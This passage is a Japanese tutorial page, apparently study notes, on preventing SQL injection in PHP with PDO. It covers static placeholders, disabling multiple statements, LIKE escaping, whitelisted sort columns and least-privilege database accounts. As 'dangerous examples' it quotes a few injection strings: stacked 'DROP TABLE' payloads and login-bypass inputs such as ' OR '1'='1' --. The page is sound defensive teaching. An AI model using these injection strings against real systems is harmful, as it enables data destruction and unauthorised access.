+    error_log($e-&gt;getMessage());
+    echo '処理中にエラーが発生しました。';
+}</code></pre>
+    <div class="table-wrap"><table>
+      <thead><tr><th>例外モードの利点</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong>エラーの見落とし防止</strong></td><td>失敗時に処理が続行されない</td></tr>
+        <tr><td><strong>一貫したエラー処理</strong></td><td>try-catch で統一的に処理</td></tr>
+        <tr><td><strong>情報漏洩の防止</strong></td><td>詳細をログのみに記録</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-8-3">8.3 複文の実行を禁止する</h3>
+    <p><strong>複文（複数 SQL の連続実行）</strong> が可能だと、<code>; DROP TABLE</code> 等の攻撃が成立しやすくなります。</p>
+    <p class="code-label bad">✕ 危険な例</p>
+<pre><code>SELECT * FROM users WHERE id = 1; DROP TABLE users; --</code></pre>
+    <div class="table-wrap"><table>
+      <thead><tr><th>対策</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong>プレースホルダ</strong></td><td>1 文ずつ実行</td></tr>
+        <tr><td><strong>mysqlnd の設定</strong></td><td><code>PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false</code>（MySQL）</td></tr>
+        <tr><td><strong>DB ユーザー権限</strong></td><td>不要な権限を剥奪</td></tr>
+      </tbody>
+    </table></div>
+    <p><strong>mysqlnd</strong> は PHP が MySQL と通信するためのドライバ（接続部品）です。</p>
+    <p class="code-label good">○ MySQL：複文実行を禁止</p>
+<pre><code>// MySQL：複文実行を禁止
+$pdo = new PDO($dsn, $user, $pass, [
+    PDO::ATTR_EMULATE_PREPARES =&gt; false,
+    PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false,
+]);</code></pre>
+
+    <h2 id="sec-9"><span class="num">9.</span>静的プレースホルダと動的プレースホルダ</h2>
+    <h3 id="sec-9-1">9.1 静的プレースホルダを指定する</h3>
+    <p><strong>静的プレースホルダ</strong> とは、DB サーバー側で SQL を <strong>事前コンパイル</strong>（実行できる形に解析しておくこと）し、プレースホルダの位置を固定する方式です。</p>
+<pre><code>PDO::ATTR_EMULATE_PREPARES =&gt; false  // 静的（ネイティブ）プレースホルダ</code></pre>
+    <h4>静的プレースホルダの流れ</h4>
+<pre><code>1. PREPARE: SELECT * FROM users WHERE id = ?
+   → DB が SQL 構造をコンパイル
+
+2. EXECUTE: [123]
+   → データのみバインドして実行
+
+3. EXECUTE: [456]
+   → 同じ SQL に別データをバインド（再利用可能）</code></pre>
+
+    <h3 id="sec-9-2">9.2 静的と動的の違い</h3>
+    <p>PDO には <strong>エミュレート（模擬）</strong> モードがあり、動作が異なります。エミュレートモードのプレースホルダを <strong>動的プレースホルダ</strong> と呼びます。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th></th><th>静的プレースホルダ</th><th>動的プレースホルダ（エミュレート）</th></tr></thead>
+      <tbody>
+        <tr><td><strong>設定</strong></td><td><code>EMULATE_PREPARES = false</code></td><td><code>EMULATE_PREPARES = true</code>（一部環境のデフォルト）</td></tr>
+        <tr><td><strong>処理場所</strong></td><td>DB サーバー</td><td>PHP（クライアント）側</td></tr>
+        <tr><td><strong>SQL コンパイル</strong></td><td>DB が事前にコンパイル</td><td>PHP が <code>?</code> を置換してから送信</td></tr>
+        <tr><td><strong>安全性</strong></td><td><strong>高い（推奨）</strong></td><td>設定次第でリスクあり</td></tr>
+        <tr><td><strong>同一 SQL の再利用</strong></td><td>効率的</td><td>毎回置換</td></tr>
+      </tbody>
+    </table></div>
+
+    <figure>
+    <svg viewBox="0 0 720 270" role="img" aria-label="静的プレースホルダでは、PHPがSQLの骨格と値を別々にDBサーバーへ送り、DBが構造を固定してから値を入れる。動的プレースホルダでは、PHPが ? を値に置き換えて1本のSQLにしてからDBへ送る">
+      <defs>
+        <marker id="arw203c" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="d-arrowhead"/></marker>
+      </defs>
+      <text x="20" y="24" class="d-text-bold">静的プレースホルダ（EMULATE_PREPARES = false）</text>
+      <rect x="20" y="40" width="160" height="80" rx="8" class="d-box"/>
+      <text x="100" y="74" text-anchor="middle" class="d-text-bold">PHP（PDO）</text>
+      <text x="100" y="96" text-anchor="middle" class="d-text-sub">そのまま渡すだけ</text>
+      <line x1="180" y1="62" x2="478" y2="62" class="d-line" marker-end="url(#arw203c)"/>
+      <text x="330" y="54" text-anchor="middle" class="d-text-sub">① PREPARE：… WHERE id = ?</text>
+      <line x1="180" y1="100" x2="478" y2="100" class="d-line" marker-end="url(#arw203c)"/>
+      <text x="330" y="92" text-anchor="middle" class="d-text-sub">② EXECUTE：[123]（値だけ）</text>
+      <rect x="480" y="40" width="220" height="80" rx="8" class="d-box-good"/>
+      <text x="590" y="68" text-anchor="middle" class="d-text-bold">DB サーバー</text>
+      <text x="590" y="90" text-anchor="middle" class="d-text-sub">先に構造をコンパイル</text>
+      <text x="590" y="108" text-anchor="middle" class="d-text-sub">→ 値を ? にバインド</text>
+
+      <text x="20" y="164" class="d-text-bold">動的プレースホルダ（EMULATE_PREPARES = true）</text>
+      <rect x="20" y="180" width="160" height="80" rx="8" class="d-box-warn"/>
+      <text x="100" y="212" text-anchor="middle" class="d-text-bold">PHP（PDO）</text>
+      <text x="100" y="234" text-anchor="middle" class="d-text-sub">? を値に置換する</text>
+      <line x1="180" y1="220" x2="478" y2="220" class="d-line" marker-end="url(#arw203c)"/>
+      <text x="330" y="212" text-anchor="middle" class="d-text-sub">完成した1本の SQL：… WHERE id = 123</text>
+      <rect x="480" y="180" width="220" height="80" rx="8" class="d-box"/>
+      <text x="590" y="212" text-anchor="middle" class="d-text-bold">DB サーバー</text>
+      <text x="590" y="234" text-anchor="middle" class="d-text-sub">受け取った SQL を解釈</text>
+    </svg>
+    <figcaption>図：静的は「骨格」と「値」が別の便で DB に届く。動的は PHP 側で組み立てた1本の SQL が届く</figcaption>
+    </figure>
+
+    <h4>動的（エミュレート）の問題</h4>
+<pre><code>EMULATE_PREPARES = true の場合:
+  PHP が ? を値に置換してから DB に送る
+  → 実装によってはエスケープ漏れのリスク
+  → 必ず false に設定する</code></pre>
+    <p>動的プレースホルダも、PHP が値を正しくエスケープしてくれる限りは安全ですが、文字コードの設定などによっては漏れが生じる余地があります。DB 側で構造と値を分ける静的プレースホルダなら、原理的に入力が SQL の形を変えられません。</p>
+    <div class="callout key">
+      <p class="callout-title">推奨</p>
+      <p>常に <code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code> を指定します。</p>
+    </div>
+
+    <h2 id="sec-10"><span class="num">10.</span>検索とソートで注意すること</h2>
+    <h3 id="sec-10-1">10.1 ワイルドカードのエスケープが必要な文字</h3>
+    <p><strong>LIKE 句</strong>（「〜を含む」のような部分一致検索の書き方）では、<code>%</code> と <code>_</code> が <strong>ワイルドカード</strong>（任意の文字にマッチする特別な記号）として特別な意味を持ちます。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>文字</th><th>意味</th></tr></thead>
+      <tbody>
+        <tr><td><code>%</code></td><td>任意の 0 文字以上</td></tr>
+        <tr><td><code>_</code></td><td>任意の 1 文字</td></tr>
+      </tbody>
+    </table></div>
+    <h4>問題</h4>
+<pre><code>// ユーザーが「100%」を検索
+$keyword = '100%';
+$sql = "SELECT * FROM products WHERE name LIKE '%$keyword%'";
+// → LIKE '%100%%' となり「100」で始まるすべてにマッチ</code></pre>
+    <div class="callout warn">
+      <p class="callout-title">補足：マッチする範囲の訂正</p>
+      <p><code>LIKE '%100%%'</code> は先頭にも <code>%</code> があるので、「100 で始まる」ではなく <strong>「100 を含むすべて」</strong> にマッチします（末尾の <code>%%</code> は <code>%</code> 1つと同じ意味）。いずれにせよ、利用者が探したかった「100%」という文字を含む商品だけには絞れません。</p>
+    </div>
+    <h4>対策：ESCAPE 句</h4>
+    <p class="code-label good">○ ワイルドカードをエスケープ</p>
+<pre><code>// ✅ ワイルドカードをエスケープ
+$keyword = str_replace(['\\', '%', '_'], ['\\\\', '\\%', '\\_'], $userInput);
+$stmt = $pdo-&gt;prepare('SELECT * FROM products WHERE name LIKE ? ESCAPE \'\\\'');
+$stmt-&gt;execute(['%' . $keyword . '%']);</code></pre>
+    <p><code>ESCAPE</code> 句は「この文字の直後の <code>%</code> や <code>_</code> はただの文字として扱う」という指定です。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>エスケープが必要な文字</th><th>エスケープ後</th></tr></thead>
+      <tbody>
+        <tr><td><code>\</code></td><td><code>\\</code></td></tr>
+        <tr><td><code>%</code></td><td><code>\%</code></td></tr>
+        <tr><td><code>_</code></td><td><code>\_</code></td></tr>
+      </tbody>
+    </table></div>
+    <div class="callout warn">
+      <p class="callout-title">補足：MySQL での ESCAPE 句の書き方</p>
+      <p>上の PHP コードで DB に届く SQL は <code>ESCAPE '\'</code> です。MySQL は標準設定だと文字列中の <code>\</code> を「次の文字をエスケープする記号」として扱うため、<code>'\'</code> は閉じ引用符まで飲み込んで構文エラーになります。MySQL では <code>ESCAPE '\\'</code> と書く（または MySQL の LIKE は既定で <code>\</code> がエスケープ文字なので ESCAPE 句を省く）必要があります。DB ごとの差を避けたいなら、エスケープ文字に <code>#</code> など <code>\</code> 以外を使い、<code>#</code>・<code>%</code>・<code>_</code> の前に <code>#</code> を付ける方法もあります。</p>
+    </div>
+    <div class="callout key">
+      <p class="callout-title">注意</p>
+      <p>LIKE 用のエスケープは <strong>プレースホルダとは別</strong> の処理です。プレースホルダで SQL の注入を防ぎ、LIKE 用にワイルドカードをエスケープします。</p>
+    </div>
+
+    <h3 id="sec-10-2">10.2 検索条件が動的に変わる場合</h3>
+    <p>「キーワード」「カテゴリ」「価格帯」など、<strong>条件の組み合わせが可変</strong> する検索では、SQL の組み立て方に注意が必要です。</p>
+    <p class="code-label bad">✕ 危険なパターン</p>
+<pre><code>// ❌ 列名をユーザー入力から構成
+$column = $_GET['field'];
+$sql = "SELECT * FROM products WHERE $column = ?";  // 列名はプレースホルダ不可！</code></pre>
+    <p>プレースホルダに入れられるのは <strong>値</strong> だけで、列名やテーブル名のような <strong>SQL の構造部分</strong> には使えません。そのため列名は別の方法で守ります。</p>
+    <p class="code-label good">○ 安全なパターン</p>
+<pre><code>// ✅ 列名はホワイトリストで検証
+$allowedFields = ['name', 'category', 'price'];
+$field = $_GET['field'];
+if (!in_array($field, $allowedFields, true)) {
+    die('不正な検索項目です');
+}
+
+$conditions = [];
+$params = [];
+
+if (!empty($_GET['name'])) {
+    $conditions[] = 'name LIKE ?';
+    $params[] = '%' . escapeLike($_GET['name']) . '%';
+}
+if (!empty($_GET['category'])) {
+    $conditions[] = 'category = ?';
+    $params[] = $_GET['category'];
+}
+
+$where = $conditions ? 'WHERE ' . implode(' AND ', $conditions) : '';
+$sql = "SELECT * FROM products $where";
+$stmt = $pdo-&gt;prepare($sql);
+$stmt-&gt;execute($params);</code></pre>
+    <p><strong>ホワイトリスト（許可リスト）</strong> とは、「使ってよいもの」を先に列挙し、それ以外をすべて拒否する方式です。SQL に並べる条件の文字列（<code>'name LIKE ?'</code> など）はコード側で固定し、利用者の入力は <code>$params</code> に入れてプレースホルダで渡しています。<code>escapeLike()</code> は、10.1 のワイルドカードのエスケープ処理を関数にまとめたものを想定しています。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>項目</th><th>対策</th></tr></thead>
+      <tbody>
+        <tr><td><strong>値</strong></td><td>プレースホルダ</td></tr>
+        <tr><td><strong>列名・テーブル名</strong></td><td>ホワイトリスト</td></tr>
+        <tr><td><strong>演算子（AND/OR）</strong></td><td>コード側で固定</td></tr>
+        <tr><td><strong>LIKE パターン</strong></td><td>ワイルドカードエスケープ</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-10-3">10.3 様々な列でのソート</h3>
+    <p><strong>ORDER BY</strong> 句（並べ替えの指定）にユーザー入力をそのまま使うと、SQLインジェクションの原因になります。</p>
+    <p class="code-label bad">✕ 危険なパターン</p>
+<pre><code>// ❌ 脆弱
+$sort = $_GET['sort'];
+$sql = "SELECT * FROM products ORDER BY $sort";
+// 攻撃: ?sort=price; DROP TABLE products; --</code></pre>
+    <p class="code-label good">○ 安全なパターン</p>
+<pre><code>// ✅ ソート列をホワイトリストで限定
+$allowedSort = [
+    'name'  =&gt; 'name ASC',
+    'price' =&gt; 'price ASC',
+    'date'  =&gt; 'created_at DESC',
+];
+$sort = $_GET['sort'] ?? 'name';
+$orderBy = $allowedSort[$sort] ?? $allowedSort['name'];
+
+$sql = "SELECT * FROM products ORDER BY $orderBy";
+// 列名はホワイトリストから選ばれた固定値のみ</code></pre>
+    <p><code>??</code> は「左側が未定義なら右側を使う」という PHP の演算子です。利用者が送った値は「どれを選ぶか」の鍵としてだけ使われ、SQL に入るのはコードに書いた固定の文字列だけです。</p>
+    <h4>昇順・降順の切り替え</h4>
+    <p class="code-label good">○ 列名も方向も許可リストから選ぶ</p>
+<pre><code>$allowedColumns = ['name', 'price', 'created_at'];
+$column = $_GET['column'] ?? 'name';
+$dir = ($_GET['dir'] ?? 'asc') === 'desc' ? 'DESC' : 'ASC';
+
+if (!in_array($column, $allowedColumns, true)) {
+    $column = 'name';
+}
+
+$sql = "SELECT * FROM products ORDER BY $column $dir";</code></pre>
+    <div class="callout key">
+      <p class="callout-title">原則</p>
+      <p>ORDER BY の <strong>列名・方向</strong> はユーザー入力を直接使わず、<strong>許可リストから選択</strong> します。</p>
+    </div>
+
+    <h2 id="sec-11"><span class="num">11.</span>保険的対策</h2>
+    <h3 id="sec-11-1">11.1 SQLインジェクション保険的対策とは</h3>
+    <p><strong>プレースホルダ</strong> が根本対策ですが、万が一の被害を <strong>軽減する保険</strong> も重要です。</p>
+<pre><code>根本対策:  プレースホルダ（Prepared Statement）
+保険的対策: エラー抑止、入力検証、DB 権限設定</code></pre>
+    <p>複数の守りを重ねる考え方は <a href="../../71_セキュリティ基礎/00_全体像/20-2_深層防御.html">深層防御</a> で詳しく扱っています。</p>
+
+    <h3 id="sec-11-2">11.2 詳細なエラーメッセージの抑止</h3>
+    <p>本番環境では DB エラーの <strong>詳細をユーザーに見せない</strong> ようにします。</p>
+    <p class="code-label good">○ 本番環境の設定</p>
+<pre><code>// 本番環境
+ini_set('display_errors', '0');
+$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+try {
+    // DB 処理
+} catch (PDOException $e) {
+    error_log($e-&gt;getMessage());  // ログのみ
+    http_response_code(500);
+    echo 'エラーが発生しました。';
+}</code></pre>
+    <p><code>display_errors</code> は PHP のエラーを画面に出すかどうかの設定、<code>500</code> は「サーバー内部エラー」を表す HTTP ステータスコードです。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>環境</th><th>表示</th></tr></thead>
+      <tbody>
+        <tr><td><strong>開発</strong></td><td>詳細エラー表示（デバッグ用）</td></tr>
+        <tr><td><strong>本番</strong></td><td>汎用メッセージのみ</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-11-3">11.3 入力値の妥当性の検証</h3>
+    <p>プレースホルダの <strong>補助</strong> として、第4章（00_全体像/02_Webアプリの機能と脆弱性）で学んだ入力値検証を行います。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>項目</th><th>検証</th></tr></thead>
+      <tbody>
+        <tr><td>ID</td><td>整数か、正の値か</td></tr>
+        <tr><td>ページ番号</td><td>1〜9999 の範囲</td></tr>
+        <tr><td>ソート項目</td><td>許可リストに含まれるか</td></tr>
+        <tr><td>検索キーワード</td><td>最大文字数</td></tr>
+      </tbody>
+    </table></div>
+    <p class="code-label good">○ ID の検証</p>
+<pre><code>$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
+if ($id === false || $id &lt; 1) {
+    die('不正な ID です');
+}</code></pre>
+    <div class="callout warn">
+      <p class="callout-title">注意</p>
+      <p>入力値検証だけでは SQLインジェクションを完全に防げません。たとえば名前欄では <code>'</code> を含む名前（O'Brien など）も正当な入力なので、検証で弾けないことがあります。必ず <strong>プレースホルダと併用</strong> します。</p>
+    </div>
+
+    <h3 id="sec-11-4">11.4 データベースの権限設定</h3>
+    <p>DB ユーザーには <strong>必要最小限の権限</strong> のみを付与します。万が一 SQLインジェクションが成功しても <strong>被害を限定</strong> できます。最小権限の原則そのものは <a href="../../71_セキュリティ基礎/00_全体像/20-1_最小権限とデータ最小化.html">最小権限とデータ最小化</a>（「データベースのアカウント」の項）を参照してください。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>権限</th><th>Web アプリ用 DB ユーザー</th></tr></thead>
+      <tbody>
+        <tr><td>SELECT</td><td>必要なテーブルのみ</td></tr>
+        <tr><td>INSERT / UPDATE / DELETE</td><td>必要なテーブルのみ</td></tr>
+        <tr><td>DROP / CREATE / ALTER</td><td>❌ 付与しない</td></tr>
+        <tr><td>FILE</td><td>❌ 付与しない</td></tr>
+        <tr><td>SUPER / SHUTDOWN</td><td>❌ 付与しない</td></tr>
+        <tr><td>GRANT</td><td>❌ 付与しない</td></tr>
+      </tbody>
+    </table></div>
+    <p class="code-label good">○ 例（MySQL）</p>
+<pre><code>-- アプリ専用ユーザーを作成
+CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
+
+-- 必要な操作のみ許可
+GRANT SELECT, INSERT, UPDATE, DELETE ON myapp.* TO 'webapp'@'localhost';
+
+-- 管理用ユーザーとは別アカウントにする</code></pre>
+    <h4>多層防御</h4>
+    <ol class="steps">
+      <li><strong>プレースホルダ</strong> → 攻撃そのものを防ぐ</li>
+      <li><strong>入力値検証</strong> → 不正入力を早期に弾く</li>
+      <li><strong>エラー抑止</strong> → 情報漏洩を防ぐ</li>
+      <li><strong>最小権限</strong> → 突破されても被害を限定</li>
+    </ol>
+
+    <h2 id="sec-12"><span class="num">12.</span>XSS と並べて見る・AI に書かせたとき</h2>
+    <h3 id="sec-12-1">12.1 2つを並べると</h3>
+    <p>SQLインジェクションと XSS（→ <a href="20-1_XSSの基本.html">XSSの基本</a>）は、根っこが同じ「データが命令として読まれる」穴です。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th></th><th>SQLインジェクション</th><th>XSS</th></tr></thead>
+      <tbody>
+        <tr><td>読み手</td><td>データベース</td><td>見た人のブラウザ</td></tr>
+        <tr><td>化ける記号</td><td>引用符</td><td>尖った括弧</td></tr>
+        <tr><td>対策</td><td>値を別の便で渡す</td><td>文字として表示する形に変える</td></tr>
+        <tr><td>被害</td><td>データを抜かれる・消される</td><td>見た人の画面で勝手にプログラムが動く</td></tr>
+      </tbody>
+    </table></div>
+    <p>読み手が違うだけで、やっていることは同じです。どちらも <strong>データと命令の境界ではっきり分ける</strong> ことが対策になります。</p>
+
+    <h3 id="sec-12-2">12.2 AI に書かせたとき見るところ</h3>
+    <ol class="steps">
+      <li><strong>SQL や HTML を入力とつないで作っていないか。</strong> 足し算だけでなく、テンプレート文字列（バッククォート <code>`…${…}`</code>）の中に埋め込む書き方も同じです。動くけれど境界が消えていることがあり、動くから気づきにくいのです</li>
+      <li><strong><code>innerHTML</code> や <code>dangerously</code> で始まる書き方を使っていないか。</strong> 使うなら、本当に HTML として入れる必要があるのか理由を聞きます（XSS 側の確認点です）</li>
+      <li><strong>「入力をチェックしたから安全」で済ませていないか。</strong> チェックは大事ですが、それだけに頼ると1か所の漏れで終わりです。チェックしたうえで境界でも分ける <strong>二重の守り</strong> が基本です（チェックは入口、分けるのは最後の砦）</li>
+      <li><strong>便利な部品（DB を楽に扱う部品など）の抜け道を使っていないか。</strong> 生の SQL を書ける機能で値をつないでいたら、部品を使っていても同じ穴が開きます</li>
+    </ol>
+    <p class="code-label bad">✕ テンプレート文字列でも「つないでいる」のと同じ</p>
+<pre><code>const sql = `SELECT * FROM users WHERE name = '${name}'`;</code></pre>
+    <p class="code-label good">○ 値は別の便で渡す</p>
+<pre><code>const result = await db.query('SELECT * FROM users WHERE name = ?', [name]);</code></pre>
+
+    <h3 id="sec-12-3">12.3 動画のまとめ</h3>
+    <ul>
+      <li>原因は、データのつもりの文字が命令として読まれること（入力がデータと命令の境界を越える）</li>
+      <li>SQLインジェクションの読み手は DB、XSS の読み手はコメントを見た人のブラウザ</li>
+      <li>対策は境界で分けること。SQL は値を別の便で、HTML は文字として表示する形に。<strong>消すより混ぜない</strong></li>
+      <li>攻撃手法のカタログは覚えなくてよい。境界がどこにあるかを見れば、新しい手口にも対応できる</li>
+    </ul>
+
+    <h2 id="sec-13"><span class="num">13.</span>まとめ</h2>
+    <div class="table-wrap"><table>
+      <thead><tr><th>トピック</th><th>要点</th></tr></thead>
+      <tbody>
+        <tr><td>SQLインジェクション</td><td>悪意ある SQL を注入して DB を不正操作</td></tr>
+        <tr><td>エラーメッセージ経由</td><td>詳細エラーが SQL 構造の手がかりになる</td></tr>
+        <tr><td>UNION SELECT</td><td>他テーブルのデータを結合して窃取</td></tr>
+        <tr><td>認証回避</td><td><code>' OR '1'='1' --</code> 等でログインを突破</td></tr>
+        <tr><td>データ改ざん</td><td>UPDATE / DELETE / DROP による破壊</td></tr>
+        <tr><td>OS コマンド実行</td><td>DB 拡張機能の悪用（権限依存）</td></tr>
+        <tr><td>ファイル読み書き</td><td>LOAD_FILE / INTO OUTFILE 等</td></tr>
+        <tr><td>文字リテラル</td><td>引用符で囲む箇所が注入ポイント</td></tr>
+        <tr><td>数値項目</td><td>引用符なしでも OR / UNION で攻撃可能</td></tr>
+        <tr><td>プレースホルダ</td><td><strong>根本対策</strong>。SQL とデータを分離</td></tr>
+        <tr><td>PDO オプション</td><td><code>EMULATE_PREPARES=false</code>, 例外モード</td></tr>
+        <tr><td>複文禁止</td><td><code>;</code> による複数 SQL 実行を防ぐ</td></tr>
+        <tr><td>静的プレースホルダ</td><td>DB 側で事前コンパイル（推奨）</td></tr>
+        <tr><td>LIKE ワイルドカード</td><td><code>%</code> <code>_</code> をエスケープ</td></tr>
+        <tr><td>動的検索・ソート</td><td>列名はホワイトリスト、値はプレースホルダ</td></tr>
+        <tr><td>保険的対策</td><td>エラー抑止、入力検証、最小権限</td></tr>
+      </tbody>
+    </table></div>
+    <h3 id="sec-13-1">13.1 対策の優先順位</h3>
+    <ol class="steps">
+      <li>プレースホルダによる SQL 文組み立て（必須）</li>
+      <li>PDO：<code>EMULATE_PREPARES = false</code>、例外処理、複文禁止</li>
+      <li>動的な列名・ORDER BY はホワイトリスト</li>
+      <li>LIKE 検索はワイルドカードをエスケープ</li>
+      <li>詳細エラーを抑止</li>
+      <li>入力値の妥当性検証（補助）</li>
+      <li>DB ユーザーの最小権限（保険）</li>
+    </ol>
+    <div class="callout key">
+      <p class="callout-title">このページの要点</p>
+      <ul>
+        <li>原因は、入力が SQL の <strong>命令部分とデータ部分の境界を越える</strong> こと</li>
+        <li>根本対策は <strong>プレースホルダ</strong>。PDO では <strong>静的プレースホルダ（<code>EMULATE_PREPARES =&gt; false</code>）</strong> にする</li>
+        <li>列名・ORDER BY などプレースホルダが使えない場所は <strong>ホワイトリスト</strong></li>
+        <li>エラー抑止・入力検証・最小権限は、突破されたときの <strong>保険</strong></li>
+      </ul>
+    </div>
+    <p>次の <a href="20-4_OSコマンドインジェクション.html">OSコマンドインジェクション</a> では、同じ「データが命令になる」穴が OS のシェルで起きるケースを学びます。なお、徳丸本の章の順では次は CSRF やセッション管理の章で、CSRF は <a href="30-1_CSRF.html">CSRF</a> のページで扱います。</p>
+
+    <h2 id="sec-14"><span class="num">14.</span>理解度チェック</h2>
+    <details>
+      <summary>Q1. ログイン画面のユーザー名に <code>admin' --</code> と入れると、なぜパスワードなしでログインできてしまうのですか？</summary>
+      <div class="body">
+        <p><code>'</code> でユーザー名の文字列が閉じられ、続く <code>--</code> で後ろの <code>AND password = '...'</code> がコメントになって無視されるからです。SQL は「ユーザー名が admin の行」だけを探す文になり、パスワードの条件が消えます。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q2. 数値の ID は引用符で囲まないので安全、という考えはなぜ誤りですか？</summary>
+      <div class="body">
+        <p>囲いがないので、閉じる必要すらなく <code>1 OR 1=1</code> や <code>1 UNION SELECT …</code> をそのまま SQL として読ませられるからです。<code>FILTER_VALIDATE_INT</code> などの型検証とプレースホルダを併用します。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q3. プレースホルダを使うと、<code>' OR '1'='1' --</code> のような入力はどう扱われますか？</summary>
+      <div class="body">
+        <p>SQL の骨格が先に DB に渡って形が確定しているので、値は後から <code>?</code> に入る「ただの文字」として扱われます。「<code>' OR '1'='1' --</code> という名前の人」を探すだけで、該当なしになります。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q4. PDO で <code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code> を指定するのはなぜですか？</summary>
+      <div class="body">
+        <p>静的プレースホルダにするためです。<code>true</code>（動的・エミュレート）だと PHP 側で <code>?</code> を値に置換した1本の SQL が送られ、実装によってはエスケープ漏れのリスクがあります。<code>false</code> なら DB サーバーが構造を先にコンパイルし、値は別に渡されます。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q5. 並べ替えの列名を利用者に選ばせたいとき、プレースホルダで渡せないのはなぜで、どう守りますか？</summary>
+      <div class="body">
+        <p>プレースホルダに入れられるのは値だけで、列名や <code>ASC</code>/<code>DESC</code> のような SQL の構造部分には使えないからです。許可する列名・方向をコードに列挙した <strong>ホワイトリスト</strong> から選び、リストにない入力は既定値に置き換えます。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q6. プレースホルダを使っていれば、DB ユーザーの権限は管理者のままでもかまいませんか？</summary>
+      <div class="body">
+        <p>かまいません、とは言えません。どこか1か所でもつなぎ漏れがあれば、管理者権限だと DROP やファイル書き出し（Web シェル設置）、OS コマンド実行まで被害が広がります。最小権限にしておけば、突破されても被害を限定できます。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q7. AI が書いたコードで ORM（DB を楽に扱う部品）を使っていれば、SQLインジェクションの心配はありませんか？</summary>
+      <div class="body">
+        <p>ありません、とは言えません。ORM にも生の SQL を書ける機能があり、そこで値をテンプレート文字列などでつないでいれば同じ穴が開きます。「入力をつないで SQL を作っていないか」を確認します。</p>
+      </div>
+    </details>
+
+    <h2 id="sources">参考資料</h2>
+    <ul class="sources">
+      <li>ノート：72_Web脆弱性対策/20_インジェクション/03_SQL呼び出しに伴う脆弱性（徳丸本7章）</li>
+      <li>ノート：72_Web脆弱性対策/20_インジェクション/04_SQLインジェクションとXSS（ねる前エンジニアリング）</li>
+      <li>徳丸浩『体系的に学ぶ 安全なWebアプリケーションの作り方 第2版』SBクリエイティブ</li>
+      <li>ねる前エンジニアリング「よくある脆弱性の中身 — SQLインジェクションとXSS」 https://www.youtube.com/watch?v=XrUN2NfrNi4</li>
+      <li>OWASP Cheat Sheet Series「SQL Injection Prevention Cheat Sheet」 https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</li>
+      <li>PHP マニュアル「PDO」 https://www.php.net/manual/ja/book.pdo.php</li>
+      <li>IPA「安全なSQLの呼び出し方」</li>
+    </ul>
+
+    <nav class="pager" aria-label="ページ移動">
+      <a class="prev" href="20-2_XSS発展編.html"><span class="lbl">← 前のページ</span>XSS発展編：属性・JavaScript内のXSS</a>
+      <a class="idx" href="00-0_目次.html">目次</a>
+      <a class="next" href="20-4_OSコマンドインジェクション.html"><span class="lbl">次のページ →</span>OSコマンドインジェクション</a>
+    </nav>
+  </main>
+</div>
+
+<script src="../../_解説HTML/script.js"></script>
+</body>
+</html>
